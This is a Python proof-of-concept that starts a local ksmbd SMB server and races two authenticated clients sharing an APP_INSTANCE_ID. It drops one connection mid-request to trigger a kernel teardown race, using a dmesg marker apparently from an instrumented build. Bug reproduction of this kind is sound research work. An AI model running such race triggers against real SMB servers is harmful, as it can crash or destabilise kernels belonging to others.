#!/usr/bin/env python3
"""Local-only ksmbd APP_INSTANCE_ID teardown race test for a disposable VM."""
import os
import socket
import subprocess
import threading
import time
import uuid

from smbprotocol.connection import Connection
from smbprotocol.create_contexts import (
    SMB2CreateAppInstanceId,
    SMB2CreateContextRequest,
    SMB2CreateDurableHandleRequestV2,
)
from smbprotocol.open import (
    CreateDisposition,
    CreateOptions,
    FileAttributes,
    FilePipePrinterAccessMask,
    ImpersonationLevel,
    Open,
    RequestedOplockLevel,
    ShareAccess,
)
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect

SERVER = "127.0.0.1"
PORT = 445
USERNAME = "ksmbdtest"
PASSWORD = "KsmBd-Lab-Only-42!"
SHARE = rf"\\{SERVER}\race"
FILENAME = "app-instance-race.dat"
MARKER = "KSMBD_APP_INSTANCE_RACE_WINDOW"
CONF = "/etc/ksmbd/ksmbd.conf"
PWDDB = "/etc/ksmbd/ksmbdpwd.db"
SHARE_PATH = "/tmp/ksmbd-race-share"


def start_server():
    os.makedirs("/etc/ksmbd", exist_ok=True)
    os.makedirs(SHARE_PATH, exist_ok=True)
    os.chmod(SHARE_PATH, 0o777)
    with open(CONF, "w", encoding="utf-8") as f:
        f.write(
            "[global]\n"
            "server string = ksmbd isolated race lab\n"
            "workgroup = WORKGROUP\n"
            "\n"
            "[race]\n"
            f"path = {SHARE_PATH}\n"
            "read only = no\n"
            "guest ok = no\n"
            f"valid users = {USERNAME}\n"
        )
    subprocess.run(
        ["ksmbd.adduser", "-a", "-p", PASSWORD, "-C", CONF, "-P", PWDDB, USERNAME],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    log = open("/tmp/ksmbd-mountd.log", "w", encoding="utf-8")
    proc = subprocess.Popen(
        ["ksmbd.mountd", "-n", "-C", CONF, "-P", PWDDB],
        stdout=log,
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            log.flush()
            raise RuntimeError(
                "ksmbd.mountd exited early: "
                + open("/tmp/ksmbd-mountd.log", encoding="utf-8").read()
            )
        try:
            with socket.create_connection((SERVER, PORT), timeout=0.2):
                time.sleep(0.5)
                print("KSMBD_SERVER_READY", flush=True)
                return proc, log
        except OSError:
            time.sleep(0.1)
    log.flush()
    raise RuntimeError(
        "ksmbd did not listen on 127.0.0.1:445: "
        + open("/tmp/ksmbd-mountd.log", encoding="utf-8").read()
    )


def connect(client_guid):
    conn = Connection(client_guid, SERVER, PORT)
    conn.connect()
    sess = Session(conn, USERNAME, PASSWORD)
    sess.connect()
    tree = TreeConnect(sess, SHARE)
    tree.connect()
    return conn, tree


def create_contexts(app_id):
    durable = SMB2CreateDurableHandleRequestV2()
    durable["timeout"] = 300000
    durable["flags"] = 0
    durable["reserved"] = 0
    durable["create_guid"] = uuid.uuid4()

    app = SMB2CreateAppInstanceId()
    app["structure_size"] = 20
    app["reserved"] = 0
    app["app_instance_id"] = app_id.bytes_le

    durable_ctx = SMB2CreateContextRequest()
    durable_ctx["buffer_name"] = durable.NAME
    durable_ctx["buffer_data"] = durable

    app_ctx = SMB2CreateContextRequest()
    app_ctx["buffer_name"] = app.NAME
    app_ctx["buffer_data"] = app
    return [durable_ctx, app_ctx]


def create_durable(tree, app_id):
    handle = Open(tree, FILENAME)
    handle.create(
        impersonation_level=ImpersonationLevel.Impersonation,
        desired_access=(
            FilePipePrinterAccessMask.GENERIC_READ
            | FilePipePrinterAccessMask.GENERIC_WRITE
        ),
        file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
        share_access=(
            ShareAccess.FILE_SHARE_READ
            | ShareAccess.FILE_SHARE_WRITE
            | ShareAccess.FILE_SHARE_DELETE
        ),
        create_disposition=CreateDisposition.FILE_OPEN_IF,
        create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        create_contexts=create_contexts(app_id),
        oplock_level=RequestedOplockLevel.SMB2_OPLOCK_LEVEL_BATCH,
    )
    return handle


def marker_seen():
    try:
        result = subprocess.run(
            ["dmesg"],
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )
        return MARKER in result.stdout
    except Exception:
        return False


def main():
    # Server and both authenticated clients are confined to this QEMU guest.
    server, server_log = start_server()
    app_id = uuid.uuid4()

    conn_b, tree_b = connect(uuid.uuid4())
    handle_b = create_durable(tree_b, app_id)
    print("HOLDER_OPENED durable-v2 + batch oplock + APP_INSTANCE_ID", flush=True)

    conn_a, tree_a = connect(uuid.uuid4())
    request_done = threading.Event()
    request_error = []

    def contender():
        try:
            create_durable(tree_a, app_id)
            print("CONTENDER_CREATE_RETURNED", flush=True)
        except Exception as exc:
            request_error.append(repr(exc))
            print("CONTENDER_CREATE_ERROR", repr(exc), flush=True)
        finally:
            request_done.set()

    thread = threading.Thread(target=contender, daemon=True)
    thread.start()

    deadline = time.monotonic() + 15
    while time.monotonic() < deadline and not marker_seen():
        if request_done.is_set():
            break
        time.sleep(0.005)

    if not marker_seen():
        raise RuntimeError(
            "The contender did not reach ksmbd_app_instance_id_matches(); "
            "check server startup, durable-v2 grant, and create-context support."
        )

    print("READER_IN_WINDOW; dropping holder TCP connection now", flush=True)
    # Abrupt TCP close drives session_fd_check() while the other connection
    # is in ksmbd_app_instance_id_matches().
    conn_b.transport.close()

    thread.join(timeout=8)
    if thread.is_alive():
        print("CONTENDER_STILL_WAITING", flush=True)
    else:
        print("CONTENDER_FINISHED", flush=True)

    # Keep the server and connection objects alive until the attempt ends.
    _ = (handle_b, conn_a, tree_a, tree_b, request_error, server, server_log)
    print("RACE_ATTEMPT_FINISHED", flush=True)


if __name__ == "__main__":
    main()
